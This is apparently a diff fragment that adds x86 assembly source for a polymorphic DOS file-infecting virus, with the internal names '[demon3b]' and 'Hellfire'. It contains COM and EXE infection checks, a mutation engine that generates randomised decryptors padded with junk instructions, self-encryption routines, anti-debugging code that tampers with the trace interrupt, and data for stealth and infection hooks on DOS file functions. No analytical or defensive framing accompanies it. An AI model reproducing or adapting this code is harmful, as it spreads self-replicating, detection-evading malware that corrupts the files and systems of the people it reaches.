+; ************************************************************************
+; This reads from file handle in BX
+; ************************************************************************
+read_from_handle:
+	mov	ah, 3fh
+	int	ALT_INT
+	ret
+; ************************************************************************
+; This closes file handle in BX
+; ************************************************************************
+close_file_handle:
+	mov	ah, 3eh		; Close file
+	int	ALT_INT
+	ret
+; ************************************************************************
+; This opens file at DS:DX
+; ************************************************************************
+open_file_handle:
+	mov	ah, 3dh
+	int	ALT_INT
+	ret
+; ************************************************************************
+; This changes attributes of file in DTA
+; ************************************************************************
+attributes:
+	mov	ax, 4301h
+	lea	dx, ds: [dta+30]
+	int	ALT_INT
+	ret
+; ************************************************************************
+; This sets the DTA
+; ************************************************************************
+set_dta:
+	mov	ah, 1ah
+	int	ALT_INT
+	ret
+; ***************************************************************************
+; This moves the file pointer
+; ***************************************************************************
+move_pointer:
+	mov	ah, 42h
+	xor	cx, cx
+	xor	dx, dx
+	int	ALT_INT
+	ret
+nail_end:
+; ************************************************************************
+; AX=File length
+; returns carry if infected
+; ************************************************************************
+com_infection_check:
+	mov	dx, WORD PTR cs: [dta+1ah]
+	sub	dx, VIRUS_SIZE+3 ; real file size
+	sub	dx, WORD PTR cs: [read_buf+1]
+	clc
+	cmp	dx, 0		; DX will be zero
+	jne	not_inf
+	stc
+not_inf:
+	ret
+;returns: CARRY IF NOT CORRECT EXE FORMAT
+is_this_exe_the_right_type:
+	mov	cx, WORD PTR cs: [dta+1ah] ; DI:CX = Size of file
+	mov	di, WORD PTR cs: [dta+1ch] ; 
+	mov	ax, WORD PTR cs: [MY_SIZE_IN_PAGES]
+	dec	ax
+	mov	dx, 512
+	mul	dx
+	add	ax, WORD PTR cs: [MY_SIZE_MOD_512]
+	adc	dx, 0
+	cmp	dx, di
+	jnz	icky_exe
+	cmp	ax, cx
+	jnz	icky_exe
+	cmp	WORD PTR cs: [RELOCATION_TABLE], 40h
+	jz	icky_exe
+	clc
+	ret
+icky_exe:
+	stc
+	ret
+; ************************************************************************
+; RETURNS - Carry if Infected, 
+; ************************************************************************
+exe_infection_check:
+	mov	cx, WORD PTR cs: [dta+1ah] ; DI:CX = Size of file
+	mov	di, WORD PTR cs: [dta+1ch] ; 
+	mov	ax, WORD PTR cs: [MY_CODE_SEGMENT]
+	add	ax, WORD PTR cs: [MY_HEADER_SIZE]
+	mov	dx, 10h
+	mul	dx
+	add	ax, WORD PTR cs: [EXE_IP] ; DX:AX =  CS:IP
+	adc	dx, 0		; 
+	sub	cx, VIRUS_SIZE	; Subtract virus size
+	sbb	di, 0		; from DI:CX
+	cmp	cx, ax		; See filesize-virus is CS:IP
+	jnz	no_infection
+	cmp	dx, di
+	jnz	no_infection
+exe_is_infected:
+	stc
+	ret
+no_infection:
+	clc
+	ret
+; ***************************************************************************
+; ***************************************************************************
+; Polymorphic Module Starts Here, Oh Baby Yah!
+; ***************************************************************************
+; ***************************************************************************
+AL_	=	1b
+AH_	=	10b
+AX_	=	11b
+BL_	=	100b
+BH_	=	1000b
+BX_	=	1100b
+CL_	=	10000b
+CH_	=	100000b
+CX_	=	110000b
+DL_	=	1000000b
+DH_	=	10000000b
+DX_	=	11000000b
+DI_	=	100000000b
+SI_	=	1000000000b
+BP_	=	10000000000b
+u_reg_table DB	al_, ah_, cl_, ch_, dl_, dh_, bl_, BH_
+polymorph: 			; PHASE 1 2 3 NOT NEEDED   -> omited
+	call	pushall
+	push	cs
+	pop	ds
+	push	cs
+	pop	es
+	mov	di, OFFSET encryption_routine
+	push	di
+	mov	WORD PTR [used_registers], 0
+more_zeros:
+	call	time
+	stosb
+	cmp	di, OFFSET end_of_virus
+	jnz	more_zeros
+	mov	di, OFFSET indexer_init
+	call	phase5
+	pop	di
+	call	phase4
+	call	phase6
+	call	phase7
+	call	phase8
+	call	put_dummies
+	call	phase10
+	call	phase11
+	call	phase12
+	call	popall
+	ret
+put_dummies:
+IF	NO_GARBAGE
+	ret
+ENDIF
+	mov	BYTE PTR [dummy_counter], 0
+try_dummy_again:
+	mov	bx, (65535/7)
+	call	time2
+	inc	BYTE PTR [dummy_counter]
+	cmp	BYTE PTR [dummy_counter], 7
+	jz	all_tries_exhasted
+	mov	cx, WORD PTR [used_registers]
+	cmp	al, 0
+	jnz	try_al_1
+	test	cx, dummy_0_registers
+	jnz	try_al_1
+	jmp	p_dummy_0
+try_al_1:
+	cmp	al, 1
+	jnz	try_al_2
+	test	cx, dummy_1_registers
+	jnz	try_al_2
+	jmp	p_dummy_1
+try_al_2:
+	cmp	al, 2
+	jnz	try_al_3
+	test	cx, dummy_2_registers
+	jnz	try_al_3
+	jmp	p_dummy_2
+try_al_3:
+	cmp	al, 3
+	jnz	try_al_4
+	test	cx, dummy_3_registers
+	jnz	try_al_4
+	jmp	p_dummy_3
+try_al_4:
+	cmp	al, 4
+	jnz	try_al_5
+	test	cx, dummy_4_registers
+	jnz	try_al_5
+	jmp	p_dummy_4
+try_al_5:
+	cmp	al, 5
+	jnz	try_al_6
+	test	cx, dummy_5_registers
+	jnz	try_al_6
+	jmp	p_dummy_5
+try_al_6:
+	cmp	al, 6
+	jnz	all_tries_exhasted
+	test	cx, dummy_6_registers
+	jnz	try_dummy_again
+	jmp	p_dummy_6
+all_tries_exhasted:
+	ret
+dummy_counter DB ?
+DUMMY_6_REGISTERS=0
+p_dummy_6:
+IF	NO_BRANCH
+	jmp	try_dummy_again
+ENDIF
+	call	coin_flip
+	jnc	no_iret_dummy
+	mov	ax, 0e9ch
+	stosw
+	call	which_register_do_we_use
+	mov	al, 0cfh
+	jmp	SHORT put_branch
+no_iret_dummy:
+	call	which_register_do_we_use
+	mov	al, 0c3h
+put_branch:
+	stosb
+	ret
+which_register_do_we_use:
+	mov	cx, WORD PTR [used_registers]
+	mov	bx, (65535/6)
+	call	time2
+	cmp	al, 0
+	jnz	aa1
+	test	cx, AX_
+	jz	we_use_ax
+aa1:
+	cmp	al, 1
+	jnz	aa2
+	test	cx, BX_
+	jz	we_use_bx
+aa2:
+	cmp	al, 2
+	jnz	aa3
+	test	cx, CX_
+	jz	we_use_cx
+aa3:
+	cmp	al, 3
+	jnz	aa4
+	test	cx, DX_
+	jz	we_use_dx
+aa4:
+	cmp	al, 4
+	jnz	aa5
+	test	cx, SI_
+	jz	we_use_si
+aa5:
+	test	cx, DI_
+	jz	we_use_di
+	jmp	which_register_do_we_use
+we_use_ax:
+	mov	al, 0b8h
+	jmp	SHORT slam_it_in
+we_use_bx:
+	mov	al, 0bbh
+	jmp	SHORT slam_it_in
+we_use_cx:
+	mov	al, 0b9h
+	jmp	SHORT slam_it_in
+we_use_dx:
+	mov	al, 0bah
+	jmp	SHORT slam_it_in
+we_use_si:
+	mov	al, 0beh
+	jmp	SHORT slam_it_in
+we_use_di:
+	mov	al, 0bfh
+slam_it_in:
+	stosb			; MOV opcode in place
+	push	ax		; b8 3412 50 ret xx
+	mov	ax, di
+	add	ax, WORD PTR [delta_offset+1]
+	add	ax, 4
+	stosw			; operands in place
+	pop	ax
+	sub	al, 68h		; push opcode in place
+	stosb
+	ret
+DUMMY_0_REGISTERS = AX_ + DX_ + CX_
+DUMMY_0_DUMMY_SIZE = end_dummy_0_dummy-dummy_0_dummy
+dummy_0_dummy:
+	mov	ah, 02ah
+	int	21h
+end_dummy_0_dummy:
+p_dummy_0:
+	mov	si, OFFSET dummy_0_dummy
+	mov	cx, DUMMY_0_DUMMY_SIZE
+	repnz	movsb
+	ret
+DUMMY_1_REGISTERS = AX_
+DUMMY_1_DUMMY_SIZE = end_dummy_1_dummy-dummy_1_dummy
+dummy_1_dummy:
+        MOV     ah,1        
+        int     16h
+end_dummy_1_dummy:
+p_dummy_1:
+	mov	si, OFFSET dummy_1_dummy
+	mov	cx, DUMMY_1_DUMMY_SIZE
+	repnz	movsb
+	ret
+DUMMY_2_REGISTERS = AX_+BX_+CX_
+DUMMY_2_DUMMY_SIZE = end_dummy_2_dummy-dummy_2_dummy
+dummy_2_dummy:
+        Mov Ah,30h
+        int 21h
+        cmp al,2
+        jnc otay_dos
+        mov ah,4Ch
+        int 21h
+otay_dos:
+end_dummy_2_dummy:
+p_dummy_2:
+	mov	si, OFFSET dummy_2_dummy
+	mov	cx, DUMMY_2_DUMMY_SIZE
+	repnz	movsb
+	ret
+DUMMY_3_REGISTERS = AX_
+DUMMY_3_SIZE =	end_dummy_3_dummy-dummy_3_dummy
+dummy_3_dummy:
+	mov	ah, 19h
+	int	21h
+end_dummy_3_dummy:
+p_dummy_3:
+	mov	si, OFFSET dummy_3_dummy
+	mov	cx, DUMMY_3_SIZE
+	repnz	movsb
+	ret
+DUMMY_4_REGISTERS = AX_+BX_+CX_
+DUMMY_4_SIZE =	end_dummy_4_dummy-dummy_4_dummy
+dummy_4_dummy:
+	mov	ah, 30h
+	int	21h
+end_dummy_4_dummy:
+p_dummy_4:
+	mov	si, OFFSET dummy_4_dummy
+	mov	cx, DUMMY_4_SIZE
+	repnz	movsb
+	ret
+DUMMY_5_REGISTERS = AL_
+DUMMY_5_SIZE =	end_dummy_5_dummy-dummy_5_dummy
+dummy_5_dummy:
+	push	ax
+	push	bx
+	push	cx
+	push	dx
+	cli
+	add	sp, 8
+	sti
+end_dummy_5_dummy:
+p_dummy_5:
+	mov	si, OFFSET dummy_5_dummy
+	mov	cx, DUMMY_5_SIZE
+	repnz	movsb
+	ret
+random_segment:
+	mov	bx, (65535/4)
+	call	time2
+	cmp	al, 0
+	jz	in_ds
+	cmp	al, 1
+	jz	in_cs
+	cmp	al, 2
+	jz	in_es
+	cmp	al, 3
+	jz	in_ss
+in_cs:
+	mov	al, 2eh
+	jmp	SHORT blah_blah
+in_ss:
+	mov	al, 36h
+	jmp	SHORT blah_blah
+in_es:
+	mov	al, 26h
+blah_blah:
+	stosb
+in_ds:
+	ret
+put_dummy_int:
+	mov	si, OFFSET int_table ; Point to table
+	mov	bx, (65535/9)	; 1/6 odds
+	call	time2		; Get index from odds
+	cmp	al, 0
+	jz	itz_int_3
+	mov	al, 0cdh
+	stosb
+	movsb
+	ret
+itz_int_3:
+	mov	al, 0cch
+	stosb
+	ret
+; *************************************************************************
+phase4:
+; *************************************************************************
+	call	coin_flip
+	jc	dummies_fir
+	mov	WORD PTR ds: [entry], di
+	call	put_dummies
+	jmp	SHORT blahblahblahblahblah
+dummies_fir:
+	call	put_dummies
+	mov	WORD PTR ds: [entry], di
+blahblahblahblahblah:
+	call	put_dummy_int
+	ret
+; *************************************************************************
+phase5:
+; *************************************************************************
+	mov	si, OFFSET index_table ; Point to table
+	mov	bx, (65535/3)	; 1/3 odds
+	call	time2		; Get index from odds
+	cmp	al, 1
+	jz	bitmap_si
+	cmp	al, 2
+	jz	bitmap_di
+bitmap_bx:
+	mov	cx, BX_
+	mov	ah, 0bh
+	jmp	SHORT dew_it
+bitmap_di:
+	mov	cx, DI_
+	mov	ah, 0fh
+	jmp	SHORT dew_it
+bitmap_si:
+	mov	cx, SI_
+	mov	ah, 0eh
+dew_it:
+	or	WORD PTR [used_registers], cx
+	mov	BYTE PTR ds: [indexer_mask], ah ; Save mask for opcode
+	mov	BYTE PTR ds: [index_table_choice], al ; Save it
+	movsb			; Store Byte from table
+	mov	ax, WORD PTR ds: [delta_offset+1]
+	add	ax, OFFSET encryption_start-start
+	stosw			; Put Operand for estart
+	ret
+; *************************************************************************
+phase6:
+; *************************************************************************
+	call	coin_flip
+	jc	dummies_first
+	mov	WORD PTR ds: [disave], di ; pointer (for jump later)
+	call	put_dummies
+	jmp	SHORT dummies_last
+dummies_first:
+	call	put_dummies
+	mov	WORD PTR ds: [disave], di ; pointer (for jump later)
+dummies_last:
+	cmp	BYTE PTR [pr_type], 3
+	jnz	leave_it_out
+	call	random_segment
+	jmp	com_proggie
+leave_it_out:
+	mov	al, 2eh		; CS Segment Override
+	stosb
+com_proggie:
+	mov	al, 08ah	; WRITE MOV opcode
+	stosb
+	mov	al, BYTE PTR ds: [index_table_choice]
+	cmp	al, 1
+	je	pick_si		; pick from MOV XX, [SI]
+	cmp	al, 2
+	je	pick_di		; pick from MOV XX, [DI]
+pick_bx:
+	mov	si, OFFSET mov_table2 ; point to MOV XX, BX table
+	mov	bx, (65535/6)
+	call	pick_mov_table	; pick 8-bit reg-^
+	add	dl, 3
+	jmp	SHORT check	; make sure it's ok to use
+pick_si:
+	mov	si, OFFSET mov_table2 ; point to MOV XX, SI table
+	mov	bx, (65535/8)
+	call	pick_mov_table	; pick 8-bit reg-^
+	jmp	SHORT check	; make sure it's ok to use
+pick_di:
+	mov	si, OFFSET mov_table2 ; point to MOV XX, DI table
+	mov	bx, (65535/8)
+	call	pick_mov_table	; pick 8-bit reg-^
+	add	dl, 1		; 
+check:
+	mov	al, dl
+	stosb			; write the opcode
+	mov	BYTE PTR ds: [mov_choice], dl
+	ret
+pick_mov_table:
+	call	time2		; Get Index from odds
+	mov	dl, BYTE PTR ds: [si] ; 
+	mov	BYTE PTR ds: [xor_help], al
+	mov	si, OFFSET u_reg_table
+	mov	ah, 0
+	add	si, ax
+	mov	al, BYTE PTR [si]
+	or	BYTE PTR [used_registers], al
+	ret
+; *************************************************************************
+phase7:
+	call	put_dummies
+	mov	al, BYTE PTR ds: [xor_help] ; 8-bit Register from phase 3
+	cmp	al, 00h		; Check for AL reg
+	jz	special_al	; (AL is a wierd one)
+	mov	BYTE PTR ds: [di], 080h ; otherwise write the
+	inc	di		; XOR opcode for other regs
+special_al:
+	mov	bx, (65535/5)
+IF	NO_ROLROR
+	mov	bx, (65535/3)
+ENDIF
+	call	time2
+	mov	BYTE PTR [crypt_function], al
+	cmp	al, 0
+	jz	use_xor_table
+	cmp	al, 1
+	jz	use_sub_table
+	cmp	al, 2
+	jz	use_add_table
+	cmp	al, 3
+	jz	use_ror_table
+	cmp	al, 4
+	jz	use_rol_table
+use_xor_table:
+	mov	cx, 0
+	mov	ah, 0
+	jmp	SHORT get_crypt_function_opcode
+use_sub_table:
+	mov	cx, 1
+	mov	ah, 8h
+	jmp	SHORT get_crypt_function_opcode
+use_add_table:
+	mov	cx, 2
+	mov	ah, 30h
+	jmp	SHORT get_crypt_function_opcode
+use_ror_table:
+	mov	cx, 3
+	cmp	BYTE PTR [xor_help], 0
+	jnz	not_ror_al
+	mov	al, 0c0h
+	stosb
+	mov	al, 0c8h
+	stosb
+	jmp	SHORT continue_on
+not_ror_al:
+	dec	di
+	mov	al, 0c0h
+	stosb
+	mov	ah, 28h
+	jmp	SHORT get_crypt_function_opcode
+use_rol_table:
+	mov	cx, 4
+	cmp	BYTE PTR [xor_help], 0
+	jnz	not_rol_al
+	mov	al, 0c0h
+	stosb
+	mov	al, 0c0h
+	stosb
+	jmp	SHORT continue_on
+not_rol_al:
+	dec	di
+	mov	al, 0c0h
+	stosb
+	mov	ah, 30h
+	jmp	SHORT get_crypt_function_opcode
+get_crypt_function_opcode:
+	mov	si, OFFSET xor_table
+	xor	bx, bx
+	mov	bl, BYTE PTR [xor_help]
+	mov	al, BYTE PTR [si+bx]
+	sub	al, ah
+	stosb
+continue_on:
+	cmp	cx, 3
+	jz	ror_rol_1
+	cmp	cx, 4
+	jz	ror_rol_1
+	call	time
+	jmp	SHORT store_eval
+ror_rol_1:
+	mov	al, 1
+store_eval:
+	mov	BYTE PTR ds: [eval1], al
+	stosb
+	call	put_dummies
+	cmp	BYTE PTR [pr_type], 3
+	jnz	leave_it_out2
+	call	random_segment
+	jmp	com_proggie2
+leave_it_out2:
+	mov	al, 2eh		; CS Segment Override
+	stosb
+com_proggie2:
+	mov	al, 88h
+	stosb
+	mov	al, BYTE PTR ds: [mov_choice] ; And the opcode for the 8-bit
+	stosb
+	ret
+;*********************************
+phase8:
+	call	put_dummies
+	mov	bx, (65535/4)
+	call	time2
+	mov	bh, BYTE PTR ds: [indexer_mask] ; Get LEA operand
+	cmp	al, 0
+	jz	index_increment
+	cmp	al, 1
+	jz	not_neg
+	cmp	al, 2
+	jz	sub_negative1
+	cmp	al, 3
+	jz	index_add
+not_neg:
+	mov	ah, bh
+	add	ah, 0c8h
+	mov	al, 0f7h
+	stosw
+	mov	ah, bh
+	add	ah, 0d0h
+	mov	al, 0f7h
+	stosw
+	ret
+sub_negative1:
+	mov	al, 83h
+	stosb
+	mov	al, bh
+	add	al, 0e0h
+	mov	ah, 0ffh
+	stosw
+	ret
+index_add:
+	mov	al, 83h
+	stosb
+	mov	al, bh
+	add	al, 0b8h
+	mov	ah, 1
+	stosw
+	ret
+index_increment:
+	mov	al, bh
+	add	al, 38h
+	stosb
+	ret
+; *************************************************************************
+phase10:
+	mov	al, 81h
+	stosb
+	mov	al, BYTE PTR ds: [indexer_mask]
+	add	al, 0f0h
+	stosb
+	mov	ax, WORD PTR ds: [delta_offset+1]
+	add	ax, OFFSET encryption_end-start
+	stosw
+	ret
+; *************************************************************************
+phase11:
+	mov	al, 75h
+	stosb			; JNZ
+	mov	ax, di
+	mov	bx, WORD PTR ds: [disave]
+	sub	ax, bx
+	mov	dl, 0ffh
+	sub	dl, al
+	mov	BYTE PTR ds: [di], dl
+	inc	di
+	call	put_dummies
+	mov	BYTE PTR [di], 0c3h
+	mov	WORD PTR ds: [exit], di
+	ret
+phase12:
+	mov	di, OFFSET crypt_call
+	mov	al, 0e8h
+	stosb
+	mov	ax, WORD PTR ds: [entry] ; generate CALL
+	sub	ax, di
+	sub	ax, 2
+	stosw
+	ret
+; ************************************************************************
+; Here are the Opcode tables, the key elements of the polymorphic routine.
+; ************************************************************************
+index_table DB	0bbh, 0beh, 0bfh
+int_table DB	03, 01, 09h, 12h, 08h, 01ch, 11h, 28h, 70h
+xor_table DB	34h, 0f4h, 0f1h, 0f5h, 0f2h, 0f6h, 0f3h, 0f7h ; x       0
+				; special AL  (0D8h)
+mov_table2 DB	04h, 024h, 00ch, 02ch, 014h, 034h, 01ch, 03ch
+	DB	0, '[demon3b]', 0
+	DB	0, 'Hellfire', 0
+poly_end:
+; ***************************************************************************
+poly_eval DB	0
+coin_flip:
+	push	ax
+	call	time
+	pop	ax
+	and	dl, 1b
+	jz	odd
+	clc
+	jmp	SHORT evn
+odd:
+	stc
+evn:
+	ret
+time:
+	cli			; DX returns with semi-random 16 bit number
+	xor	ax, ax
+	out	43h, al
+	in	al, 40h		; Latch Timer, changes 1 million times/sec
+	mov	ah, al
+	in	al, 40h
+	sti
+	and	ax, ax
+	jz	time
+	push	cx
+	mov	cl, al
+	rol	ax, cl
+	mov	cl, ah
+	ror	ax, cl
+	pop	cx
+	mov	dx, ax
+	ret
+time2:
+	call	time
+	xor	dx, dx
+	div	bx
+	cbw
+	add	si, ax		; ADD index to table
+	ret
+; ***************************************************************************
+move_me:
+	xor	bp, bp
+	call	encryption_routine2
+	call	gen_mac3
+	lea	si, [moved+(g_opcode-move_me)]
+	mov	al, BYTE PTR [crypt_function]
+	cmp	al, 0
+	jbe	dont_flip_opcode
+	cmp	al, 1		; see if subing  encryption
+	jbe	we_are_subtracting_so_use_add
+	cmp	al, 2		; see if adding  encryption
+	jbe	we_are_adding_so_use_subract
+	cmp	al, 3		; see if rotate carry right encryption
+	jbe	we_are_ror_so_use_rol
+	cmp	al, 4		; see if rotate carry left encryption
+	jbe	we_are_rol_so_use_ror
+we_are_subtracting_so_use_add:
+	mov	WORD PTR [si], 0c102h
+	jmp	SHORT dont_flip_opcode
+we_are_adding_so_use_subract:
+	mov	WORD PTR [si], 0c12ah
+	jmp	SHORT dont_flip_opcode
+we_are_ror_so_use_rol:
+	mov	WORD PTR [si], 0c0d2h
+	jmp	SHORT dont_flip_opcode
+we_are_rol_so_use_ror:
+	mov	WORD PTR [si], 0c8d2h
+	jmp	SHORT dont_flip_opcode
+dont_flip_opcode:
+	call	gen_mac
+	xor	dx, dx		; Write to end of file
+	mov	cx, VIRUS_SIZE
+	mov	ah, 40h
+	int	ALT_INT
+	lea	si, [moved+(g_opcode-move_me)]
+	mov	al, BYTE PTR [crypt_function]
+	cmp	al, 0
+	jbe	dont_flip_opcode2
+	cmp	al, 2
+	jbe	add_subtract_encryption
+	cmp	al, 4
+	jbe	rcl_rcr_encryption
+add_subtract_encryption:
+	xor	BYTE PTR [si], 28h
+	jmp	SHORT dont_flip_opcode2
+rcl_rcr_encryption:
+	xor	BYTE PTR [si+1], 8h
+	jmp	SHORT dont_flip_opcode2
+dont_flip_opcode2:
+	push	si
+	call	gen_mac
+	pop	si
+	mov	WORD PTR [si], 0c132h
+	call	gen_mac3
+	xor	bp, bp
+	call	encryption_routine2
+	ret
+gen_mac:
+	mov	si, OFFSET encryption_start
+	mov	di, OFFSET encryption_end
+	mov	dl, BYTE PTR [eval1]
+	call	general_encrypt
+	ret
+gen_mac3:
+	mov	si, OFFSET encryption_start3
+	mov	di, OFFSET encryption_end3
+	mov	dl, BYTE PTR [eval3]
+	call	general_encrypt
+	ret
+encryption_end3:
+;-> SI=start of encryption, DI=end, DL=Encryption Key
+general_encrypt:
+g_more:
+	push	ax
+	push	cx
+	mov	cl, dl
+more_g:
+	mov	al, BYTE PTR cs: [si]
+g_opcode:
+	xor	al, cl
+	mov	BYTE PTR cs: [si], al
+	inc	si
+	cmp	si, di
+	jb	more_g
+	pop	cx
+	pop	ax
+	ret
+encryption_end2:
+kill_trace:
+	push	ds
+	push	ax
+	push	bx
+	push	cx
+	call	int_seg
+	lds	bx, DWORD PTR ds: [1h*4]
+	mov	cl, BYTE PTR [bx]
+	mov	BYTE PTR [bx], 0cfh
+	pushf
+	pop	ax
+	and	ah, 0feh
+	push	ax
+	popf
+	mov	BYTE PTR [bx], cl
+	pop	cx
+	pop	bx
+	pop	ax
+	pop	ds
+	ret
+encryption_routine2:
+	mov	ah, 1
+	int	16h
+key_b_move:
+	mov	cx, (encryption_end2-encryption_start2)AND 0fffeh ; Done yet?
+	lea	si, [encryption_end2+bp-2] ; point to start of prog
+more2:
+	nop
+	mov	ax, [si]
+	test	cx, 10b
+	jz	e3
+	DB	035h
+eval2	DW	0
+	jmp	SHORT SHORT store_it
+e3:
+	DB	035h
+eval3	DW	0
+store_it:
+	nop
+	mov	[si], ax
+	sub	si, 2
+	sub	cx, 2
+	jnz	more2
+ret_code:
+	iret
+end_of_move_me:
+; ***************************************************************************
+; ***************************************************************************
+; ***************************************************************************
+; Encryption Ends Here, code above is encrypted, code below is not.
+; ***************************************************************************
+encryption_end:
+; ************************************************************************
+; Storage areas essential to program restoration
+; ************************************************************************
+pr_type	DB	?
+exe_pages DW	?
+exe_mod_512 DW	?
+min_mem	DW	?
+max_mem	DW	?
+saved_ss_sp DD	?
+saved_cs_ip DB	?
+save3	DB	0cdh, 20h, 90h	; <- For 1st Generation .COM file
+;Mighty Polymorphing Encryption Routine.
+used_registers DW ?		; bitmap
+encryption_routine:
+	ret
+	DB	130 DUP(090h)
+end_of_virus:
+; ***************************************************************************
+; The Heap starts right here
+; ***************************************************************************
+;D=Disinfect, I=Infect, (other)=Do Nothing
+;S=Stealth ON, (other)=Stealth OFF
+;Y=Yes, N=No
+func_4b01h DB	?
+func_4bh DB	?
+func_43h DB	?
+func_56h DB	?
+func_3dh DB	?
+func_6ch DB	?
+func_36h DB	?
+func_3eh DB	?
+func_4eh DB	?
+func_4fh DB	?
+func_11h DB	?
+func_12h DB	?
+func_49h DB	?
+func_35h DB	?
+func_25h DB	?
+infect_on_find DB ?
+hide_size DB	?
+int_function DW	?
+nasty	DB	?
+offset_of_name_in_sft DW ?
+disk_free_save DW ?
+	DW	?
+	DW	?
+	DW	?
+end_of_critical_space:
+indexer_mask DB	?
+crypt_function DB ?
+stack_cs_ip DD	?
+read_buf DB	25h DUP(?)
+block	DW	?
+mcb_seg	DW	?
+dta_save DD	?
+dta	DB	43 DUP(?)
+save13	DD	?		; <-- Vector before virus active
+save13_b DD	?		; <-- Vector at time of infection
+save_24	DD	?
+sp_save	DW	?
+asciizbuf DB	14 DUP(?)
+r_ax	DW	?
+r_bx	DW	?
+r_cx	DW	?
+r_dx	DW	?
+r_si	DW	?
+r_di	DW	?
+r_bp	DW	?
+r_ds	DW	?
+r_es	DW	?
+ret_address DW	?
+inhandler DB	?
+seconds	DB	?
+nail_file_ok DB	?
+mov_choice DB	?
+index_table_choice DB ?
+table1_choice DB ?
+xor_help DB	?
+pop_choice DB	?
+disave	DW	?
+entry	DW	?
+exit	DW	?
+eval1	DB	?
+				; bit 1 = AL used    
+				; bit 2 = AH used                            
+				; bit 3 = BL used    
+				; bit 4 = BH used                            
+				; bit 5 = CL used    
+				; bit 6 = CH used                            
+				; bit 7 = DL used    
+				; bit 8 = DH used                            
+				; bit 9 = DI used    
+				; bit 10= SI used                            
+				; bit 12= BP used                            
+moved:
+moved_code DB	(end_of_virus-move_me) DUP(?)
+zseg:
+code	ENDS
+END
